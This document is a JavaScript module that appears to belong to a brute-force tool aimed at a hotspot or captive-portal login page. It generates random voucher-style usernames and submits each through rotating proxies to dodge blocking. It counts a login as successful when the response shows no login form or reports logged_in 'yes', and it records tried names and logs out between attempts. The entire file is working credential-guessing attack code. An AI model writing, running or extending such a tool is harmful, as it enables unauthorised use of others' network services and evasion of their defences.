
import {proxies} from "./proxies.js";
import { HttpsProxyAgent } from 'https-proxy-agent';
import axios from "axios";
import { loadConfig } from "./config.js"
import { url, logout_url, method,headers,randomPartLength,digits,prefix,suffix } from "./variables.js";
import chalk from "chalk";
import fs from "fs";
export async function checkServerConnection() {
    try {
        await axios.get(url, { timeout: 5000 });
        return true;
    } catch (err) {
        return false;
    }
}
export function Wait() {

    console.log(chalk.green(`[+] wait for connect please check from Network `));
}
export function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
export function reloading() {

    console.log(chalk.yellow("\n[*] Detected change in config.json, reloading..."));
    config = loadConfig();
}
export function NewSitting() {

    console.log(chalk.cyan("[+] New settings applied!"));
}
export function Logoutfailed(err) {
    console.log(chalk.red(`[!] Logout failed: ${err}`));
}
export function DEBUG(username, i) {
     
    console.log(chalk.magenta(`[DEBUG] ${username} Number #${i}`));
}
export function Requestfailed(username, err) {
    console.log(chalk.red(`[!] Request failed for ${username}: ${err.message}`));
}
export function AddtoFile(username) {

    fs.appendFileSync("./tested_usernames.txt", username + "\n");
}

export async function Logout(username) {

    try {
        await axios.get(logout_url, { headers });
        console.log(chalk.blue(`[!] Logout request sent for ${username}`));
    } catch (err) {
        console.log(chalk.red(`[!] Logout failed: ${err.message}`));
    }
}
export async function sendRequest(username) {
    const data = new URLSearchParams({
        username,
        domain: '1M%2F4M',
        popup: true,
        var: 'callBack',
        verfiy: false
    });

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const agent = new HttpsProxyAgent(proxy);

    if (method === "POST") {
        return await axios.post(url, data, {
            headers: headers,
            httpsAgent: agent
        });
    } else if (method === "GET") {
        const config = {
            params: {
                username: username,
                verify: 'callBack'
            },
            headers: headers,
            httpsAgent: agent
        };
        return await axios.get(url, config);
    } else {
        throw new Error(`Unsupported method: ${method}`);
    }
}

export function checkfromResponse(response) {
    try {
        if (typeof response.data === 'string') {
            if (!response.data.includes('<input')) {

                return true;


            }
            else return false;
        }
        else {


            if (response.data.logged_in === 'yes') {

                return true;
            } else
                return false;

        }

    } catch (err) {
        console.log(chalk.red(`[!] Request failed for  ${err.message}`));
        return false;
    }
}
export function LoadUsernamesToTest() {
    let usernames = new Set();
    if (fs.existsSync('tested_usernames.txt')) {
        const oldTested = fs.readFileSync('./tested_usernames.txt', 'utf-8')
            .split(/\r?\n/)
            .filter(Boolean);
        oldTested.forEach(username => usernames.add(username));
    }
    return usernames;
}   
export function generateUsername() {
    let randomPart = '';
    for (let i = 0; i < randomPartLength; i++) {
        randomPart += digits.charAt(Math.floor(Math.random() * digits.length));
    }
    return prefix + randomPart + suffix;
}

export function generateAlphaNumUsername() {
    const letters = "abcdefghijklmnopqrstuvwxyz";
    const digits = "0123456789";
    const chars = letters + digits;

    let randomPart = "";
    let hasLetter = false;
    let hasDigit = false;

    while (randomPart.length < randomPartLength) {
        const char = chars.charAt(Math.floor(Math.random() * chars.length));
        randomPart += char;

        if (letters.includes(char)) hasLetter = true;
        if (digits.includes(char)) hasDigit = true;
    }

    if (!hasLetter || !hasDigit) {
        return generateAlphaNumUsername(prefix, suffix, randomPartLength);
    }

    return prefix + randomPart + suffix;
}
